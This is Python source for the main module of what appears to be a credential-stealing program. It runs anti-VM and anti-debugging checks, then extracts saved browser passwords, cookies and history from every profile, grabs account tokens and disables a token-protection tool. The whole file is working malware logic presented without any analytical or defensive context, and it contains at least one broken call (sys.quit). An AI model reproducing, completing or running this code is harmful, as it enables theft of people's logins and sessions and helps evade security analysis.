from core import extractor
from core import antivm
from core import sysinfo
from core import tokengrabber

from threading import Thread

import os
import sys

class Main:
    def __init__(self) -> None:
        pass

    def antivm(self):
        if antivm.Antivm.run():
            sys.quit()
        
        antivm.AntiDebug.checks()
        

    def browser(self):
        for browserKey in extractor.browsers_profile:
            browserValue = extractor.browsers_profile[browserKey]

            if os.path.exists(browserValue):
                profiles = ["Default"]

                for folder in os.listdir(browserValue):
                    if folder.startswith("profile".lower()):
                        profiles.append(folder)

                for profile in profiles:
                    browserExtractor = extractor.Extract(browserValue+"\\Local State")
                    history = browserExtractor.extractHistory(browserValue+f"\\{profile}\\History")
                    passwd = browserExtractor.extractPasswd(browserValue+f"\\{profile}\\Login Data")
                    cookies = browserExtractor.extractCookies(browserValue+f"\\{profile}")
                

        for browserKey in extractor.browsers:
            browserValue = extractor.browsers[browserKey]

            if os.path.exists(browserValue):
                browserExtractor = extractor.Extract(browserValue+"\\Local State")
                history = browserExtractor.extractHistory(browserValue+"\\History")
                passwd = browserExtractor.extractPasswd(browserValue+"\\Login Data")
                cookies = browserExtractor.extractCookies(browserValue)

                print(history)
                print(passwd)
                print(cookies)

    def steam(self):
        pass

    def token(self):
        tokens = tokengrabber.extract_tokens().tokens
        print(tokens)
        extractor.Anti_tokenprotector.killprotector()

    def run(self):
        antivm.Antivm.run()
        antivm.Antidbg.proc_check()
        antivm.Antidbg.dll_check()

        Thread(target=antivm.Antidbg.process_check).start()

        self.browser()
        self.token()

if __name__ == "__main__":
    Main().run()